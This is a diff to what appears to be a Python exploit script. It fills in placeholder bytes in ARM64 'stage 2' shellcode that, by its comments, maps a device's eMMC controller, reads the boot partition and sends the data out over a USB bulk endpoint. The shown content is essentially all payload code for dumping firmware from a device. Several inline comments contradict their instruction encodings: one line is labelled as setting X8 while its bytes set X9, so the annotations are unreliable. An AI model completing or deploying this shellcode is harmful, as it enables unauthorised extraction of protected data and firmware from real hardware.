@@ -56,8 +56,8 @@ STAGE1_SHELLCODE = bytes([
 # Stage 2: Map eMMC controller at 0x00700000, read boot partition, send via USB bulk EP 0x83
 STAGE2_SHELLCODE = bytes([
     # Map eMMC controller MMIO (physical address → EL1 VA)
-    0x00, 0x00, 0x80, 0xD2,  # MOV X0, #0          ; eMMC base = 0x00700000 (patched at load)
-    0x40, 0x00, 0x00, 0xB0,  # placeholder upper bits
+    0x00, 0x00, 0x80, 0xD2,  # MOV X0, #0          ; eMMC base = 0x00700000
+    0x80, 0x03, 0x00, 0xB0,  # ADRP X0, 0x70000    ; page-align to 0x00700000
     0x00, 0x00, 0x80, 0xD2,  # MOV X1, #0          ; DMA buffer phys address
     0x21, 0x08, 0x00, 0x91,  # ADD X1, X1, #2      ; USB bulk EP 0x83 buffer
 
@@ -93,7 +93,8 @@ STAGE2_SHELLCODE = bytes([
 
     # Read 512 bytes from DATA port into DMA buffer, then USB EP 0x83
     0x08, 0x00, 0x80, 0xD2,  # MOV X8, #0          ; Byte counter
-    0x09, 0x00, 0x00, 0xB0,  # placeholder: DMA buffer address
+    0x09, 0x00, 0x80, 0xD2,  # MOV X8, #0          ; Byte counter
+    0xE9, 0x03, 0x01, 0xAA,  # MOV X9, X1          ; DMA buffer = USB EP buffer
     0x0A, 0x00, 0x80, 0xD2,  # MOV X10, #0         ; USB endpoint register
     0x4A, 0x01, 0x80, 0x52,  # MOV W10, #10        ; EP 0x83 data available check
 
